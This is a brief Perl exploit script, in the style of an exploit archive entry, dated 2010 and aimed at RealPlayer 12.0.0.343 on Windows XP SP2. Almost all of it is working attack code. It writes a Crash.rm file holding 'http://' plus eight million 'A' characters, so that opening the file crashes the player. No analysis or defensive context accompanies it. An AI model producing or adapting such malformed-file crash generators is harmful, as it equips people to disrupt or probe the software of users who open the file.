#!/user/bin/perl
# Exploit Title: [Real Player Local Crash Poc]
# Date: [2010/01/09]
# Author: [D3V!L FUCKER]
# Software Link: [http://www.real.com]
# Version: [12.0.0.343]
# Tested on: [windows XP sp2]
# Code :


$boom="http://"."A" x 8000000;

open(myfile,'>>Crash.rm') || die "Cannot Creat file\n\n";
print myfile $boom;
print "Done..!~#\n";